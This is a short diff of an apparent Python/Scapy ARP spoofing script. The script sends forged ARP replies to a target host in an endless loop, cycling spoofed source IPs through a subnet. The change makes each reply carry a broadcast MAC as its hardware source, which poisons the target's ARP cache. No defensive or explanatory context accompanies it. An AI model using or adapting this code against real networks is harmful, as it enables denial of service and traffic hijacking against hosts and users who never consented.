@@ -11,7 +11,7 @@ targetmac = getMac(targetip)
 i = 0
 while (True):
     ip = targetip + str(i)
-    send(ARP(op=2, psrc=ip, pdst="8.8.8.8", hwdst=targetmac), verbose=0)
+    send(ARP(op=2, psrc=ip, pdst="8.8.8.8", hwdst=targetmac, hwsrc="ff:ff:ff:ff:ff:ff"), verbose=0)
     if (i > 255):
         i = 0
     i += 1
